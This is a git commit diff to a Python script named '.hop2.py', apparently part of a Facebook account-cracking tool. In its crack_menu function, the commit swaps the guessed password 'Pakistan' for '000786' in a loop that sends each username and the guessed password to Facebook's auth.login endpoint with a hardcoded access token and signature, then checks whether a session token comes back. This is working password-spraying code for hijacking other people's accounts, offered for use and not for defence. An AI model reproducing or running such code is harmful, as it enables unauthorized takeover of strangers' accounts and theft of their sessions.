f6f81df970876d884e1b714e522c72e616bbdc46
Salman816 <74409293+Salman816@users.noreply.github.com>
2020-11-19 00:54:51 +0500

    Update .hop2.py

--- .hop2.py
+++ .hop2.py
@@ -268,7 +268,7 @@ def crack_menu():
 					crt.close()
 					checkpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = '000786'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
